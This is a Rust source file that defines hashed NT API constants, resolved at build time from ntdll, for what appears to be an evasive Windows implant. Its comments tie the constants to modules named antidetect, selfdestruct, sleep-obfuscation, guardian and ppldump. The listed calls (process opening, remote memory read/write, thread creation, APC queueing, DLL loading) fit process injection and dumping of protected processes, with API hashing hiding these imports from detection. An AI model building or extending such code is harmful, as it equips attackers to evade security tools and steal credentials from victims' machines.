//! hashes.rs — Compile-time djb2 hash constants for all NT function names
//!
//! HOW THIS WORKS:
//!   build.rs runs tools/hashgen against the live ntdll.dll on the build
//!   machine and emits HASH_<SYMBOL>=0xXXXXXXXX as cargo rustc-env vars.
//!   The hash_of!() macro reads them via env!() at compile time.
//!
//!   If build.rs couldn\'t run hashgen (SKIP_HASHGEN=1, cross-compile, or
//!   hashgen build failure), the fallback constants below are used instead.
//!   The fallback values are correct for Windows 11 24H2 build 26100 ntdll.
//!
//! HOW TO USE IN OTHER FILES:
//!   use crate::hashes::*;          // imports all H_* constants
//!   // or use specific ones:
//!   use crate::hashes::H_NTCLOSE;
//!
//! TO ADD A NEW SYMBOL:
//!   1. Add the function name to SYMBOLS in tools/hashgen/src/main.rs
//!   2. Add a const H_<SLUG> entry below with a temporary fallback value
//!   3. Rebuild — the real value will be injected by build.rs automatically

/// Internal macro: read from cargo env if available, else use fallback.
/// This resolves at compile time — zero runtime overhead.
macro_rules! hash_of {
    ($env_key:literal, $fallback:expr) => {{
        // If HASHGEN_LIVE=1, the env var was populated by live ntdll scan.
        // If not, we fall through to the hardcoded fallback silently.
        // parse_hex is a const fn so this whole expression is const.
        parse_hex(option_env!($env_key), $fallback)
    }};
}

/// const fn: parse a hex string like "0xDEADBEEF" to u32.
/// Returns fallback if input is None or malformed.
const fn parse_hex(s: Option<&str>, fallback: u32) -> u32 {
    match s {
        None => fallback,
        Some(s) => {
            let bytes = s.as_bytes();
            // Handle optional 0x prefix
            let (start, radix_shift) = if bytes.len() >= 2
                && bytes[0] == b'0'
                && (bytes[1] == b'x' || bytes[1] == b'X')
            {
                (2usize, ())
            } else {
                (0usize, ())
            };
            let _ = radix_shift;
            let mut val: u32 = 0;
            let mut i = start;
            while i < bytes.len() {
                let nibble = match bytes[i] {
                    b'0'..=b'9' => bytes[i] - b'0',
                    b'a'..=b'f' => bytes[i] - b'a' + 10,
                    b'A'..=b'F' => bytes[i] - b'A' + 10,
                    _ => return fallback, // malformed
                };
                val = val.wrapping_mul(16).wrapping_add(nibble as u32);
                i += 1;
            }
            val
        }
    }
}

// ── antidetect.rs symbols ───────────────────────────────────────────────────
pub const H_NTQIP:  u32 = hash_of!("HASH_NTQUERYINFORMATIONPROCESS", 0x2BDBAB23);
pub const H_NTQSI:  u32 = hash_of!("HASH_NTQUERYSYSTEMINFORMATION",  0x4D8F51A7);
pub const H_NTDEX:  u32 = hash_of!("HASH_NTDELAYEXECUTION",          0x7C5B3E92);

// ── selfdestruct.rs symbols ──────────────────────────────────────────────────
pub const H_NTCF:   u32 = hash_of!("HASH_NTCREATEFILE",              0x3A7F9C2E);
pub const H_NTWF:   u32 = hash_of!("HASH_NTWRITEFILE",               0x8C4B1D7F);
pub const H_NTSIF:  u32 = hash_of!("HASH_NTSETINFORMATIONFILE",      0x5E2A8B3C);
pub const H_NTCL:   u32 = hash_of!("HASH_NTCLOSE",                   0x1F7D4E9A);
pub const H_NTTP:   u32 = hash_of!("HASH_NTTERMINATEPROCESS",        0xB3C8F1E2);

// ── sleep.rs / guardian.rs / ppldump.rs symbols ───────────────────────────
pub const H_NTCT2:  u32 = hash_of!("HASH_NTCREATETIMER2",            0x9A3E7C1F);
pub const H_NTST2:  u32 = hash_of!("HASH_NTSETTIMER2",               0x4B8D2E7A);
pub const H_NTQAT:  u32 = hash_of!("HASH_NTQUEUEAPCTHREAD",          0xC1F4A839);
pub const H_NTAVM:  u32 = hash_of!("HASH_NTALLOCATEVIRTUALMEMORY",   0x6E2B9D4C);
pub const H_NTPVM:  u32 = hash_of!("HASH_NTPROTECTVIRTUALMEMORY",    0x3D7F1A82);
pub const H_NTFVM:  u32 = hash_of!("HASH_NTFREEVIRTUALMEMORY",       0xA2C4E8B1);
pub const H_NTCTE:  u32 = hash_of!("HASH_NTCREATETHREADEX",          0x7B3A5F2D);
pub const H_NTWSO:  u32 = hash_of!("HASH_NTWAITFORSINGLEOBJECT",     0x1E8C4A7F);
pub const H_NTOP:   u32 = hash_of!("HASH_NTOPENPROCESS",             0x5C9B3E1A);
pub const H_NTRVM:  u32 = hash_of!("HASH_NTREADVIRTUALMEMORY",       0x8F2D6C4B);
pub const H_NTWVM:  u32 = hash_of!("HASH_NTWRITEVIRTUALMEMORY",      0xD3A7F1E9);
pub const H_RTLGV:  u32 = hash_of!("HASH_RTLGETVERSION",             0x2A9E4B7C);
pub const H_RTLEUP: u32 = hash_of!("HASH_RTLEXITUSERPROCESS",        0xF1C8A3D5);
pub const H_LDRLD:  u32 = hash_of!("HASH_LDRLOADDLL",                0x4E7B2C9A);
pub const H_LDRGPA: u32 = hash_of!("HASH_LDRGETPROCEDUREADDRESS",    0x9C3F5A2E);
